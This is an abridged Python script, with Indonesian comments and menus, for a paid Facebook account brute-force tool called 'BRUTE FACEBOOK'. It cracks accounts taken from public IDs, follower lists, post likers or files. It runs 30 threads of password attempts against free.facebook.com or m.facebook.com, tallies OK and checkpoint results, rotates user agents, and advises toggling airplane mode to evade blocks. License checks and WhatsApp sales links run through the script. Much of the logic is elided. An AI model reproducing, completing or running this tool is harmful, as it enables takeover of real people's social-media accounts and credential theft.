#SC FREE NGAB
#MINIMAL RIKOD
#HASIL OK ATAU CP TERGANTUNG TARGET
#RIKOD BANG
...
ugent = []
uasm, uaMainXD, prox = [], [], []
sys.stdout.write('\x1b]2; BMB | BRUTE FACEBOOK BETA\x07')
...
def Iyah_Bang__Aku_Recode__Sc__Fall__Ucap__Si__Sarkas__Haha():
 ...
 kapan pintar nya dekkkk  {A2}╭━━┳━━┳━━╮ {reset}
 kalo masih rikod sc org  {A2}┃╭╮┃━┳┫╭╮┃{reset}
 mana nih kang rkd        {J2}┃╭╮┃╭╯┃╭╮┃{reset}
                          {J2}╰━━┻╯╱╰━━╯{reset}
                                       \n""",title=f"{P2}halo, {RW}{Definisi__Waktu()}",subtitle=f"{P2}Brute Facebook free v0.1 beta",width=80,padding=(0,11),style=f"{color_table}"))
...
def login():
	...
	try:
		head = {"User-Agent": "Mozilla/5.0 (Linux; Android 9; Redmi S2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36"}
...
def menu():
	...
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}[{color_rich}01{P2}]. crack dari id publik        {P2}[{color_rich}06{P2}]. check hasil crack\n{P2}[{color_rich}02{J2}]. crack dari id publik massal {P2}[{color_rich}07{P2}]. ganti warna tema\n{P2}[{color_rich}03{J2}]. crack dari total pengikut   {J2}[{color_rich}08{J2}]. upgrade ke premium\n{J2}[{color_rich}04{P2}]. crack dari id like post     {P2}[{color_rich}09{J2}]. hapus lisensi premium\n{J2}[{color_rich}05{J2}]. crack dari file             {P2}[{color_rich}00{P2}]. exit ( {color_rich}hapus cookie{P2} )",title=f"{P2}Menu{P2}",width=80,padding=(0,6),style=f"{color_table}"))
...
def Menu__Untuk__Bot___Si__Kontol():
    ...
    if Yang__Fitnah__Semoga__Amalnya__Baik__Dan__Yang__Sarkas__Juga__MakasihHinaanNya in [""]:
      ...
      time.sleep(3);menu()
        ...
        Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}•{P2} anda akan di arahkan ke WhatsApp")
        os.system("xdg-open https://wa.me/+6285779589954");exit()
    elif ask in ["6","06"]:
        time.sleep(3)
        menu()
    else:
...
def setting():
	...
	if hu in ['1','01']:
		...
		time.sleep(3);exit()
	urut = []
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{P2}[{color_rich}01{P2}]. metode {color_rich}free.facebook.com {H2}fast crack[white]\n{P2}[{color_rich}02{P2}]. metode {color_rich}m.facebook.com {H2}New V2',title=f"{H2}metode Grafh-Api",width=80,padding=(0,16),style=f"{color_table}"))
...
def otomatis():
	...
	if ua in ['t','T']:
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}saat ini anda menggunakan user agent bawaan dari script BFB",width=80,padding=(0,8),style=f"{color_table}"))
	...
	console.print(Columns(urut))
	Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2}mainkan mode pesawat {color_rich}5 [white]detik jika tidak mendapatkan hasil sama sekali",width=80,padding=(0,3),style=f"{color_table}"))
	global prog,des
		...
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				...
				if 'Api' in method:
					...
					pool.submit(metode_api,idf,pwv)
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f'{A2}sukses crack {H2}{len(id2)}[white] id, dengan jumlah hasil OK : {H2}{ok} {P2}CP : {K2}{cp}{reset}',width=80,padding=(0,8),style=f"{color_table}"))
		time.sleep(3);exit()
...
def Api(idf,pwv):
	...
	prog.update(des,description=f"{H2}Crack {P2}OK-:{H2}{ok} {P2}CP-:{K2}{cp} {P2}- {war}{str(loop)}/{len(id2)}")
	prog.advance(des)
	KontolXD = ua_krek()
	ses = requests.Session()
	for pw in pwv:
...
def key():
	...
	try:ses = requests.Session();asu = ses.get("https://app.cryptolens.io/api/key/Activate?token=WyIzNTQ2OTEyMiIsInpJemRYVWR2QStISkg5ZXpMRytIWWs3VkRwSENvVy9EQm9LRGxoSFUiXQ==&ProductId=18478&Key=%s&Sign=True"%(key)).json()['licenseKey']['key'];open("data/lisensi.txt","w").write(key);Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{H2}selamat lisensi yang anda masukan terdaftar ke server MBF",width=80,padding=(0,9),style=f"{color_table}"));time.sleep(3);menu()
		...
		Minimal__Jangan__Fitnah__Ya__Bang(Panel(f"{P2} lisensi yang anda masukan tidak terdaftar silahkan beli terlebih dahulu",width=80,padding=(0,1),style=f"{color_table}"));os.system("xdg-open https://wa.me/+6285779589954?text=assalamualaikum+bang+mau+beli+lisensi+crack+Facebook BFB");time.sleep(2);exit()
...
def beli_bang():
    ...
    elif zxc in ["1","01"]:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6285779589954?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+minggu");time.sleep(2);exit()
    elif zxc in ["2","02"]:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6285779589954?text=assalamualaikum+bang+mau+beli+lisensi+facebook+1+bulan");time.sleep(2);exit()
    elif zxc in ["3","03"]:Minimal__Jangan__Fitnah__Ya__Bang(f" {H2}•{P2} anda akan di arahkan ke WhatsApp");os.system("xdg-open https://wa.me/+6285779589954?text=assalamualaikum+bang+mau+beli+lisensi+facebook+full+source");time.sleep(2);exit()
